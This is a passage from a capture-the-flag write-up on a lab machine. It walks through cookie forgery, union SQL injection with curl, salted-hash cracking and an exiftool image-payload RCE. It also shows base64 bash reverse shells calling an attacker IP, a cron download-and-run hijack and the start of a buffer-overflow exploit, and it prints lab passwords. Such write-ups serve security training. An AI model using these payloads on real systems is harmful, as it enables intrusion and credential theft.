case, let\u0026rsquo;s enter overflow.htb into /etc/hosts. The page shown in http://overflow.htb is the same as before.\nWe can register a new account clicking in \u0026ldquo;Sign Up\u0026rdquo;:\nAnd then we will be logged in:\nThere is a blog page that lists vulnerabilities such as:\n Outdated Softwares Buffer Overflows Insecure File uploads SQL Truncation attack  Getting access as admin After enumerating all the website, fuzz for routes, and test for SQL injection, we get to a dead end.\nHowever, we can still try some attacks on the cookie. If the server is using DES CBC to generate the cookies, it might be vulnerable to Padding Oracle Attack. We can test it with PadBuster.\nTo use PadBuster, we must provide our cookie and the number of bytes per block (we can guess 8, and if it does not work, then 16):\n$ perl padBuster.pl http://overflow.htb 4PrZDoBliCaMXXJIg3oRxLUbV72cdBks 8 -cookie 'auth=4PrZDoBliCaMXXJIg3oRxLUbV72cdBks' -encoding 0 INFO: The original request returned the following [+] Status: 200 [+] Location: N/A [+] Content Length: 12227 The following response signatures were returned: ------------------------------------------------------- ID# Freq Status Length Location ------------------------------------------------------- 1 1 200 12227 N/A 2 ** 255 302 0 ../logout.php?err=1 ------------------------------------------------------- Enter an ID that matches the error condition NOTE: The ID# marked with ** is recommended : 2 Block 1 Results: [+] Cipher Text (HEX): 8c5d7248837a11c4 [+] Intermediate Bytes (HEX): 9589bc7cbd52fa49 [+] Plain Text: user=7ro ... Block 2 Results: [+] Cipher Text (HEX): b51b57bd9c74192c [+] Intermediate Bytes (HEX): ef360b4d867f14c1 [+] Plain Text: cky ------------------------------------------------------- ** Finished *** [+] Decrypted value (ASCII): user=7rocky [+] Decrypted value (HEX): 757365723D37726F636B790505050505 [+] Decrypted value (Base64): dXNlcj03cm9ja3kFBQUFBQ==  This tool was able to decrypt the cookie and show it in plaintext (user=7rocky). The same tool will be able to craft a cookie that would decrypt as user=admin:\n$ perl padBuster.pl http://overflow.htb 4PrZDoBliCaMXXJIg3oRxLUbV72cdBks 8 -cookie 'auth=4PrZDoBliCaMXXJIg3oRxLUbV72cdBks' -encoding 0 -plaintext 'user=admin' INFO: The original request returned the following [+] Status: 302 [+] Location: home/index.php [+] Content Length: 12227 The following response signatures were returned: ------------------------------------------------------- ID# Freq Status Length Location ------------------------------------------------------- 1 1 200 12227 N/A 2 ** 255 302 0 ../logout.php?err=1 ------------------------------------------------------- Enter an ID that matches the error condition NOTE: The ID# marked with ** is recommended : 2 Block 2 Results: [+] New Cipher Text (HEX): 23037825d5a1683b [+] Intermediate Bytes (HEX): 4a6d7e23d3a76e3d ... Block 1 Results: [+] New Cipher Text (HEX): 0408ad19d62eba93 [+] Intermediate Bytes (HEX): 717bc86beb4fdefe ------------------------------------------------------- ** Finished *** [+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA  And now we have a valid cookie to login as admin: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA.\nThere is another way to login as admin. This one is much more elegant: we only need to register a new account with admin= as username (in fact, the number of trailing = does not matter).\nThis works because the PHP code might be using this instruction to extract the user from the decrypted cookie (or a similar instruction):\nlist($a, $user) = explode('=', $decrypted_cookie);  And so, the following payloads work:\n$ php -a Interactive mode enabled php \u0026gt; list($a, $user) = explode('=', 'user=admin'); php \u0026gt; echo $user; admin php \u0026gt; list($a, $user) = explode('=', 'user=admin='); php \u0026gt; echo $user; admin php \u0026gt; list($a, $user) = explode('=', 'user=admin===='); php \u0026gt; echo $user; admin  And there is yet another way to get the cookie for user admin, that is performing a Bit Flipper Attack. This attack can be done from Burp Suite (Intruder), or it can be implemented in a custom Python script like bit_flipper.py (detailed explanation here).\nSince the server is using DES CBC encryption (8-length block), the decryption scheme is similar to this one:\nThe idea is to register an account as  `dmin or bdmin, because ` and b are the nearest ASCII characters to a. This is the result of the script for both usernames:\n$ python3 bit_flipper.py [+] Original cookie for user `dmin: 8XriuBxV78NQchc7XKNVUHlt4qIutBEK [*] Bit-flip cookie for user admin: 8XriuBxU78NQchc7XKNVUHlt4qIutBEK $ python3 bit_flipper.py [+] Original cookie for user bdmin: ioRhgV7BxTW2X8oR0UTI8r92y3rKsSA3 [*] Bit-flip cookie for user admin: ioRhgV7CxTW2X8oR0UTI8r92y3rKsSA3  The \u0026ldquo;Bit-flip\u0026rdquo; cookie is really similar to the original cookie, except for one letter. For example, in the cookie for user  `dmin, the difference is letter V, that was transformed to an U to obtain a valid cookie for admin. To determine the difference correctly, the cookies must be decoded in Base64:\n\u0026gt;\u0026gt;\u0026gt; from base64 import b64decode as b64d \u0026gt;\u0026gt;\u0026gt; b64d('8XriuBxV78NQchc7XKNVUHlt4qIutBEK').hex() 'f17ae2b81c55efc35072173b5ca35550796de2a22eb4110a' \u0026gt;\u0026gt;\u0026gt; b64d('8XriuBxU78NQchc7XKNVUHlt4qIutBEK').hex() 'f17ae2b81c54efc35072173b5ca35550796de2a22eb4110a'  Here we see that the hexadecimal digits that differ are a 5 (\u0026quot;0101\u0026quot;) and a 4 (\u0026quot;0100\u0026quot;). There was a flip on the last bit of the digit 5. What is happening can be somewhat explained with this image:\nSource: https://resources.infosecinstitute.com/topic/cbc-byte-flipping-attack-101-approach/\nHowever, notice that the first block must decrypt as user=adm (8-length block) to be valid, and this time the bit-flip occurs in the sixth byte of the encrypted cookie. Therefore, the cookie is sending a certain initial vector (IV) prepended to the ciphertext; and thus the bit-flip is happening in the IV value, like this:\nHaving said this, we could even create a user called ZZZin (plaintext cookie: user=ZZZin) and modify the last 3 bytes of the IV of the encrypted cookie so that the decryption results in user=admin. And this especial feature was added to bit_flipper.py:\n$ python3 bit_flipper.py [+] Original cookie for user ZZZin: eTFj72lzhNejCV3OoG4i8OUKa8gNvdbJ [*] Bit-flip cookie for user admin: eTFj72lIuuCjCV3OoG4i8OUKa8gNvdbJ  After all this dissertation about cryptography, we have admin access:\nFinding a SQLi As admin we can go to the \u0026ldquo;Admin Panel\u0026rdquo;, which shows a login page of CMS Made Simple:\nThere are a lot of vulnerabilities for this CMS in ExploitDB. One of them is a SQL injection vulnerability (CVE-2019-9053, 46635.py), but the exploit does not work (it might be patched).\nThe exploit extracts hashes from the database, a salt for that hashes and then tries to crack them (the hashes are MD5).\nLet\u0026rsquo;s enumerate again the website to check if there is a SQL injection. As admin we can view some logs:\nThe information shown in the modal comes from a web request to http://overflow.htb/home/logs.php?name=admin (performed with AJAX).\nWe can check here for common SQLi payloads until we get one that works (using a closing bracket):\n$ curl \"http://overflow.htb/home/logs.php?name=admin\" -H 'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA' \u0026lt;div id='last'\u0026gt;Last login : 11:00:00\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt; \u0026lt;div id='last'\u0026gt;Last login : 14:00:00\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt; \u0026lt;div id='last'\u0026gt;Last login : 16:00:00\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt; \u0026lt;div id='last'\u0026gt;Last login : 10:00:00\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt; \u0026lt;div id='last'\u0026gt;Last login : 12:00:00\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt; $ curl \"http://overflow.htb/home/logs.php?name=admin'\" -H 'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA' $ curl \"http://overflow.htb/home/logs.php?name=admin'--+-\" -H 'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA' $ curl \"http://overflow.htb/home/logs.php?name=admin')--+-\" -H 'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA' \u0026lt;div id='last'\u0026gt;Last login : 11:00:00\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt; \u0026lt;div id='last'\u0026gt;Last login : 14:00:00\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt; \u0026lt;div id='last'\u0026gt;Last login : 16:00:00\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt; \u0026lt;div id='last'\u0026gt;Last login : 10:00:00\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt; \u0026lt;div id='last'\u0026gt;Last login : 12:00:00\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt;  Now we can detect it is a Union-based SQLi on the third column:\n$ curl \"http://overflow.htb/home/logs.php?name=')+union+select+('1\" -H 'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA' $ curl \"http://overflow.htb/home/logs.php?name=')+union+select+1,('2\" -H 'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA' $ curl \"http://overflow.htb/home/logs.php?name=')+union+select+1,2,('3\" -H 'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA' \u0026lt;div id='last'\u0026gt;Last login : 3\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt;  At this point, we can extract information from the database, such as:\n$ curl \"http://overflow.htb/home/logs.php?name=')+union+select+1,2,(select+version()+order+by+'1\" -H 'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA' \u0026lt;div id='last'\u0026gt;Last login : 5.7.35-0ubuntu0.18.04.2\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt; $ curl \"http://overflow.htb/home/logs.php?name=')+union+select+1,2,(select+user()+order+by+'1\" -H 'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA' \u0026lt;div id='last'\u0026gt;Last login : developer@localhost\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt; $ curl \"http://overflow.htb/home/logs.php?name=')+union+select+1,2,(select+database()+order+by+'1\" -H 'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA' \u0026lt;div id='last'\u0026gt;Last login : logs\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt;  Exploiting SQLi To make the extraction easier, let\u0026rsquo;s create a custom script in Ruby called sqli.rb (detailed explanation here).\nThe script is designed to be run by steps. First we must enumerate the existing databases:\n$ ruby sqli.rb --get-dbs [*] Number of databases: 4. information_schema Overflow cmsmsdb logs  Now, we must enumerate tables inside each database. Let\u0026rsquo;s start with Overflow:\n$ ruby sqli.rb --db Overflow --get-tables [*] Number of tables in Overflow: 1. users  There is only one table called users. Now we can list its columns:\n$ ruby sqli.rb --db Overflow --table users --get-columns [*] Number of columns in Overflow.users: 2. username password  And finally, get the contents of both columns:\n$ ruby sqli.rb --db Overflow --table users --columns username,password [*] Number of rows in Overflow.users: 1. +----------+----------------------------------+ | username | password | +----------+----------------------------------+ | admin | c71d60439ed5590b3c5e99d95ed48165 | +----------+----------------------------------+  We have got a password hash. Just in case, we must examine the database called logs:\n$ ruby sqli.rb --db logs --get-tables [*] Number of tables in logs: 1. userlog $ ruby sqli.rb --db logs --table userlog --get-columns [*] Number of columns in logs.userlog: 3. id USERNAME Lastlogin  And there is nothing interesting at all. Finally, we must analyze the database called cmsmsdb:\n$ ruby sqli.rb --db cmsmsdb --get-tables [*] Number of tables in cmsmsdb: 47. cms_additional_users cms_additional_users_seq cms_admin_bookmarks cms_admin_bookmarks_seq cms_adminlog cms_content cms_content_props cms_content_props_seq cms_content_seq ... cms_routes cms_siteprefs cms_user_groups cms_userplugins cms_userplugins_seq cms_userprefs cms_users cms_users_seq cms_version  There are a lot of tables. The most interesting one is cms_users:\n$ ruby sqli.rb --db cmsmsdb --table cms_users --get-columns [*] Number of columns in cmsmsdb.cms_users: 10. user_id username password admin_access first_name last_name email active create_date modified_date  From this table, it seems that username and password will be useful:\n$ ruby sqli.rb --db cmsmsdb --table cms_users --columns user_id,username,password,admin_access [*] Number of rows in cmsmsdb.cms_users: 2. +---------+----------+----------------------------------+--------------+ | user_id | username | password | admin_access | +---------+----------+----------------------------------+--------------+ | 1 | admin | c6c6b9310e0e6f3eb3ffeb2baff12fdd | 1 | | 3 | editor | e3d748d58b58657bfa4dffe2def0b1c7 | 1 | +---------+----------+----------------------------------+--------------+  If we try to crack these hashes (and the one found before), they are not crackable using rockyou.txt. Here we must recall that the exploit from ExploitDB was using a salt that was stored in the database (specifically, in a table called cms_siteprefs):\n$ ruby sqli.rb --db cmsmsdb --table cms_siteprefs --get-columns [*] Number of columns in cmsmsdb.cms_siteprefs: 4. sitepref_name sitepref_value create_date modified_date $ ruby sqli.rb --db cmsmsdb --table cms_siteprefs --columns sitepref_name,sitepref_value | head -7 [*] Number of rows in cmsmsdb.cms_siteprefs: 37. +---------------+------------------+ | sitepref_name | sitepref_value | +---------------+------------------+ | sitemask | 6c2d17f37e226486 | +---------------+------------------+  And here we have the salt, now we can crack the hashes. For this purpose, I decided to use a simple Python script:\nimport hashlib salt = b'6c2d17f37e226486' wordlist = 'rockyou.txt' def crack(md5_hash): print('[+] Cracking hash:', md5_hash) with open(wordlist, 'rb') as f: for line in f.read().splitlines(): if hashlib.md5(salt + line).hexdigest() == md5_hash: print('[*] Password hash cracked:', line.decode()) break crack('c6c6b9310e0e6f3eb3ffeb2baff12fdd') crack('e3d748d58b58657bfa4dffe2def0b1c7') crack('c71d60439ed5590b3c5e99d95ed48165')  $ python3 crack.py [+] Cracking hash: c6c6b9310e0e6f3eb3ffeb2baff12fdd [+] Cracking hash: e3d748d58b58657bfa4dffe2def0b1c7 [*] Password hash cracked: alpha!@#$%bravo [+] Cracking hash: c71d60439ed5590b3c5e99d95ed48165  And we have got the password for user editor: alpha!@#$%bravo.\nFoothold on the machine These credentials are valid for the CMS, we have access to the administration panel:\nIn the footer we can see that the CMS version is CMS Made Simple 2.2.8. This is useful to find exploits. There is an RCE exploit (49345) defining a new tag in the \u0026ldquo;Extensions\u0026rdquo; section. If we go there, we find this message:\nThere is another subdomain called devbuild-job.overflow.htb.\nBefore enumerating this subdomain, we try to follow the actions listed in the exploit to gain Remote Code Execution (RCE), but without success. Therefore, it seems there is nothing more to do here.\nIf we go to http://devbuild-job.overflow.htb we will see a login form:\nThe message of the CMS said to login here with the same credentials, so let\u0026rsquo;s use again editor:alpha!@#$%bravo:\nIt seems that there is a lot to do here, but do not panic. Most of the buttons and links are disabled. Actually, the website only has one functionality, which is at the \u0026ldquo;Account\u0026rdquo; section:\nWe are able to upload images to the server, but in a peculiar way. If we analyze the response using Burp Suite (Repeater), we see a strange response:\nThe response contains the output of running exiftool to extract the metadata of the uploaded image.\nThe version of exiftool is shown in the response body (11.92). There is a Remote Code Execution (RCE) vulnerability for exiftool below version 12.24 (CVE-2021-22204).\nFollowing the steps shown in this blogpost, we are able to get RCE on the machine.\nTo craft the exploiting image, we must install djvumake. These instructions are shown in the blogpost:\n$ vim payload $ cat payload (metadata \"\\c${system('id')};\") $ bzz payload payload.bzz $ djvumake exploit.jpg INFO='1,1' BGjp=/dev/null ANTz=payload.bzz  Now if we upload exploit.jpg, we will see the output of the command id in the response:\nOnce we have got RCE, we can obtain access to the machine using a reverse shell:\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx $ vim payload $ cat payload (metadata \"\\c${system('echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash')};\") $ bzz payload payload.bzz $ djvumake exploit.jpg INFO='1,1' BGjp=/dev/null ANTz=payload.bzz  Now we upload exploit.jpg and get a connection in nc:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.119. Ncat: Connection from 10.10.11.119:44332. bash: cannot set terminal process group (1019): Inappropriate ioctl for device bash: no job control in this shell www-data@overflow:~/devbuild-job/home/profile$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@overflow:~/devbuild-job/home/profile$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm www-data@overflow:~/devbuild-job/home/profile$ export TERM=xterm www-data@overflow:~/devbuild-job/home/profile$ export SHELL=bash www-data@overflow:~/devbuild-job/home/profile$ stty rows 50 columns 158  Lateral movement to developer There are two users in /home:\nwww-data@overflow:~/devbuild-job/home/profile$ cd www-data@overflow:~$ pwd /var/www www-data@overflow:~$ ls /home developer tester  The user.txt flag is in /home/tester, and we need to be tester to actually read it. Hence, we must perform a lateral movement to user tester:\nwww-data@overflow:~$ find / -name user.txt 2\u0026gt;/dev/null /home/tester/user.txt www-data@overflow:~$ ls -l /home/tester/user.txt -rw-r----- 1 root tester 33 Dec 31 14:28 /home/tester/user.txt  As www-data we can read the PHP source code. Let\u0026rsquo;s look for clear text credentials:\nwww-data@overflow:~$ ls -la total 16 drwxr-xr-x 4 root root 4096 Sep 17 21:56 . drwxr-xr-x 14 root root 4096 Sep 17 21:56 .. drwxr-xr-x 5 www-data root 4096 Sep 29 22:03 devbuild-job drwxr-xr-x 6 www-data root 4096 Sep 29 02:31 html www-data@overflow:~$ ls -la html total 56 drwxr-xr-x 6 www-data root 4096 Sep 29 02:31 . drwxr-xr-x 4 root root 4096 Sep 17 21:56 .. drwxr-xr-x 9 www-data root 4096 Sep 29 20:12 admin_cms_panel drwxr-xr-x 5 www-data root 4096 Sep 29 02:38 assets drwxr-xr-x 2 www-data root 4096 Sep 29 20:12 config drwxr-xr-x 3 www-data root 4096 Sep 29 02:44 home -rwxr-xr-x 1 www-data root 12406 Sep 29 02:24 index.php -rwxr-xr-x 1 www-data root 2773 Sep 29 02:30 login.php -rwxr-xr-x 1 www-data root 269 May 26 2021 logout.php -rwxr-xr-x 1 www-data root 4251 Sep 29 02:31 register.php www-data@overflow:~$ ls -la html/config total 24 drwxr-xr-x 2 www-data root 4096 Sep 29 20:12 . drwxr-xr-x 6 www-data root 4096 Sep 29 02:31 .. -rw-r--r-- 1 root root 418 May 25 2021 admin_last_login.js -rwxr-xr-x 1 www-data root 391 May 18 2021 auth.php -rwxr-xr-x 1 www-data root 315 May 28 2021 db.php -rwxr-xr-x 1 www-data root 3287 May 28 2021 users.php www-data@overflow:~$ cat html/config/db.php  \u0026lt;?php #define('DB_Server', 'localhost'); #define('DB_Username', 'root'); #define('DB_Password', 'root'); #define('DB_Name', 'Overflow'); $lnk = mysqli_connect(\"localhost\", \"developer\", \"sh@tim@n\", \"Overflow\"); $db = mysqli_select_db($lnk, \"Overflow\"); if ($db == false) { dir('Cannot Connect to Database'); } ?\u0026gt;  And there is a password for user developer in MySQL. Luckily, if we try to switch user to developer using sh@tim@n as password, we get access as developer:\nwww-data@overflow:~$ su developer Password: $ echo $0 sh $ bash developer@overflow:/var/www$  Notice that we entered in a /bin/sh instead of /bin/bash.\nLateral movement to tester User developer belongs to a group called network:\ndeveloper@overflow:/var/www$ id uid=1001(developer) gid=1001(developer) groups=1001(developer),1002(network)  The members of this group are able to modify /etc/hosts:\ndeveloper@overflow:/var/www$ find / -group network 2\u0026gt;/dev/null /etc/hosts developer@overflow:/var/www$ ls -l /etc/hosts -rwxrw-r-- 1 root network 201 Jan 1 08:20 /etc/hosts  With this permission, we are able to add subdomains to the local DNS of the machine (that is, the file /etc/hosts).\nSince we need to become tester, let\u0026rsquo;s see if this user has any interesting files:\ndeveloper@overflow:/var/www$ find / -user tester 2\u0026gt;/dev/null | grep -v proc /home/tester /home/tester/.cache /home/tester/.ssh /home/tester/.profile /home/tester/.gnupg /var/mail/tester /opt/commontask.sh  There is a Bash script in /opt/commontask.sh:\ndeveloper@overflow:/var/www$ cat /opt/commontask.sh  #!/bin/bash #make sure its running every minute. bash \u0026lt; \u0026lt;(curl -s http://taskmanage.overflow.htb/task.sh)  It seems to contain a Cron job that requests a file called task.sh from http://taskmanage.overflow.htb and inputs it to Bash.\nIn this point, we must add a subdomain called taskmanage.overflow.htb into the machine\u0026rsquo;s /etc/hosts pointing to our IP address. Then, we must serve a file called task.sh so that it is downloaded and executed with Bash:\ndeveloper@overflow:/var/www$ vim /etc/hosts developer@overflow:/var/www$ cat /etc/hosts 127.0.0.1 localhost 127.0.1.1 overflow overflow.htb 10.10.17.44 taskmanage.overflow.htb # The following lines are desirable for IPv6 capable hosts ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters  $ vim task.sh $ cat task.sh  #!/bin/bash echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash  $ python -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... ::ffff:10.10.11.119 - - [] \"GET /task.sh HTTP/1.1\" 200 -  And if we were listening with nc, we get access as tester:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.119. Ncat: Connection from 10.10.11.119:44534. bash: cannot set terminal process group (7907): Inappropriate ioctl for device bash: no job control in this shell tester@overflow:~$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null tester@overflow:~$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm tester@overflow:~$ export TERM=xterm tester@overflow:~$ export SHELL=bash tester@overflow:~$ stty rows 50 columns 158  At this point, we can capture the user.txt flag:\ntester@overflow:~$ cat user.txt 9248cf7d566c232e4618be372f16fe38  Analizing a SUID binary Now that we are tester, we can check for SUID binaries:\ntester@overflow:~$ find / -perm -4000 2\u0026gt;/dev/null /usr/bin/gpasswd /usr/bin/chsh /usr/bin/newuidmap /usr/bin/newgrp /usr/bin/newgidmap /usr/bin/chfn /usr/bin/pkexec /usr/bin/sudo /usr/bin/passwd /usr/bin/traceroute6.iputils /usr/bin/at /usr/lib/snapd/snap-confine /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic /usr/lib/policykit-1/polkit-agent-helper-1 /bin/ping /bin/su /bin/umount /bin/mount /bin/fusermount /opt/file_encrypt/file_encrypt tester@overflow:~$ ls -l /opt/file_encrypt/file_encrypt -rwsr-xr-x 1 root root 11904 May 31 2021 /opt/file_encrypt/file_encrypt  There is one that might be interesting: /opt/file_encrypt/file_encrypt. Let\u0026rsquo;s see what it does:\ntester@overflow:~$ file /opt/file_encrypt/file_encrypt /opt/file_encrypt/file_encrypt: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3ae0f5750a8f1ac38945f813b5e34ddc166daf57, not stripped tester@overflow:~$ /opt/file_encrypt/file_encrypt This is the code 1804289383. Enter the Pin: 1 Wrong Pin  There is more related information inside /opt/file_encrypt:\ntester@overflow:~$ ls -la /opt/file_encrypt/ total 24 drwxr-x---+ 2 root root 4096 Sep 17 21:56 . drwxr-xr-x 3 root root 4096 Sep 17 21:56 .. -rwsr-xr-x 1 root root 11904 May 31 2021 file_encrypt -rw-r--r-- 1 root root 399 May 30 2021 README.md tester@overflow:~$ cat /opt/file_encrypt/README.md Our couple of reports have been leaked to avoid this. We have created a tool to encrypt your reports. Please check the pin feature of this application and report any issue that you get as this application is still in development. We have modified the tool a little bit that you can only use the pin feature now. The encrypt function is there but you can't use it now. The PIN should be in your inbox  The binary is made to encrypt files, but the function that actually encrypts is not called in the main program. However, the code of that function is still compiled.\nTo analyze the binary, let\u0026rsquo;s transfer it to our machine:\ntester@overflow:~$ which python3 /usr/bin/python3 tester@overflow:~$ cd /opt/file_encrypt tester@overflow:~$ python3 -m http.server 1234 Serving HTTP on :: port 1234 (http://[::]:1234/) ... 10.10.17.44 - - [] \"GET /file_encrypt HTTP/1.1\" 200 - ^C Keyboard interrupt received, exiting.  $ curl 10.10.11.119:1234/file_encrypt -so file_encrypt  Now we can use Ghidra as a reversing tool to decompile the binary and view the C source code.\nThis is the main function:\nint main() { check_pin(); return 0; }  It calls check_pin, which is this one:\nvoid check_pin() { char local_2c[20]; int local_18; long local_14; int local_10; local_10 = rand(); local_14 = random(); printf(\"This is the code %i. Enter the Pin: \", local_10); __isoc99_scanf(\"%i\", \u0026amp;local_18); if (local_14 == local_18) { printf(\"name: \"); __isoc99_scanf(\"%s\", local_2c); puts(\"Thanks for checking. You can give your feedback for improvements at developer@overflow.htb\"); } else { puts(\"Wrong Pin\"); } return; }  The code stored in local_10 is always the same: 1804289383. The program is comparing the value stored in local_14 with the PIN provided from user input.\nThe number inside of variable local_14 is the result of the function called random, which is this one:\nlong random() { uint in_stack_00000004; uint local_c; int local_8; local_c = 0x6b8b4567; for (local_8 = 0; local_8 \u0026lt; 10; local_8 = local_8 + 1) { local_c = local_c * 0x59 + 0x14; } return local_c ^ in_stack_00000004; }  Although Ghidra does not show the value of the variable in_stack_00000004, we can guess that it is 0x6b8b4567. So we can get what is the expected PIN. For example, in Python it will be:\n\u0026gt;\u0026gt;\u0026gt; local_c = 0x6b8b4567 \u0026gt;\u0026gt;\u0026gt; for _ in range(10): ... local_c = local_c * 0x59 + 0x14 ... \u0026gt;\u0026gt;\u0026gt; print(local_c ^ 0x6b8b4567) 56260846220404243151385449272  However, if we enter this PIN, it is wrong:\n$ ./file_encrypt This is the code 1804289383. Enter the Pin: 56260846220404243151385449272 Wrong Pin  Here we must notice that:\n__isoc99_scanf(\"%i\", \u0026amp;local_18);  It is reading an integer (not a long integer), so it must be truncated to 32 bits:\n\u0026gt;\u0026gt;\u0026gt; print((local_c ^ 0x6b8b4567) \u0026 0xffffffff) 4091990840  But it is still wrong:\n$ ./file_encrypt This is the code 1804289383. Enter the Pin: 4091990840 Wrong Pin  At this point, we can use GDB to debug the program and view the expected value.\nFirst, we must put a breakpoint in the comparison instruction (cmp in assembly):\n$ gdb -q file_encrypt Reading symbols from file_encrypt... (No debugging symbols found in file_encrypt) gef➤ run Starting program: ./file_encrypt This is the code 1804289383. Enter the Pin: ^C Program received signal SIGINT, Interrupt. 0xf7fcf549 in __kernel_vsyscall ()  gef➤ disassemble check_pin Dump of assembler code for function check_pin: ... 0x56555afd \u0026lt;+77\u0026gt;: push eax 0x56555afe \u0026lt;+78\u0026gt;: call 0x565556c0 \u0026lt;__isoc99_scanf@plt\u0026gt; 0x56555b03 \u0026lt;+83\u0026gt;: add esp,0x10 0x56555b06 \u0026lt;+86\u0026gt;: mov eax,DWORD PTR [ebp-0x14] 0x56555b09 \u0026lt;+89\u0026gt;: cmp DWORD PTR [ebp-0x10],eax 0x56555b0c \u0026lt;+92\u0026gt;: jne 0x56555b4a \u0026lt;check_pin+154\u0026gt; ... End of assembler dump. gef➤ break *0x56555b09 Breakpoint 1 at 0x56555b09  Now we continue the program, enter a random PIN and read the value at $ebp-0x10:\ngef➤ continue Continuing. 1 Breakpoint 1, 0x56555b09 in check_pin ()  gef➤ x $ebp-0x10 0xffffd078: 0xf3e6d338  It contains value 0xf3e6d338, which is 4091990840 in decimal. This is weird, since this is the value we tested before.\nThe trick here is that the value starts with 0xf, which means that the most significant bit is 1. If this happens, then the number must be negative. In order to compute the negative value, we must compute the two\u0026rsquo;s complement of 0xf3e6d338, which is:\n\u0026gt;\u0026gt;\u0026gt; (~0xf3e6d338 \u0026 0xffffffff) + 1 202976456  Another way of finding this value is with GDB, expressing the value as integer (format d):\ngef➤ p/d 0xf3e6d338 $1 = -202976456  Now we can try with -202976456, and it works:\ntester@overflow:~$ /opt/file_encrypt/file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name:  Exploiting a Buffer Overflow Let\u0026rsquo;s review what the check_pin function does when the PIN is correct:\nvoid check_pin() { char local_2c[20]; // ... if (local_14 == local_18) { printf(\"name: \"); __isoc99_scanf(\"%s\", local_2c); puts(\"Thanks for checking. You can give your feedback for improvements at developer@overflow.htb\"); } else { puts(\"Wrong Pin\"); } return; }  The problem here is that it is reading a string using scanf (__isoc99_scanf) and a format %s. This is vulnerable to Buffer Overflow because local_2c is assigned 20 bytes and scanf allows any string (%s) with any length. Let\u0026rsquo;s test it:\ntester@overflow:~$ /opt/file_encrypt/file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Thanks for checking. You can give your feedback for improvements at developer@overflow.htb Segmentation fault (core dumped)  It seems that we need to exploit the Buffer Overflow vulnerability. But first, we must check if the binary has any protection enabled:\ngef➤ checksec [+] checksec for './file_encrypt' Canary : ✘ NX : ✓ PIE : ✓ Fortify : ✘ RelRO : Full  It has NX enabled (so the stack is not executable) and also PIE enabled (which means that the binary addresses will be randomized if ASLR is enabled). Before going deeper, let\u0026rsquo;s check if ASLR is enabled:\ntester@overflow:~$ cat /proc/sys/kernel/randomize_va_space 0  And it is disabled, so PIE does nothing. If there was a 2, then ASLR would be enabled.\nWith a Buffer Overflow we can take control over $eip, that is the Extended Instruction Pointer register. This register contains the address of the next instruction to be executed. In fact, the program crashed because we overwrote $eip with 0x41414141 (AAAA), which is an invalid address of memory.\nNow that we know that ASLR is disabled, we can disable it in our attacker machine to debug the program in GDB:\n# echo 0 | tee /proc/sys/kernel/randomize_va_space 0  To exploit a Buffer Overflow, we must compute the number of characters needed to overwrite the return address, in order to put an exact value there. To do so, we can use a pattern:\n$ gdb -q file_encrypt Reading symbols from file_encrypt... (No debugging symbols found in file_encrypt) gef➤ pattern create 60 [+] Generating a pattern of 60 bytes (n=4) aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa [+] Saved as '$_gef0' gef➤ run Starting program: ./file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: 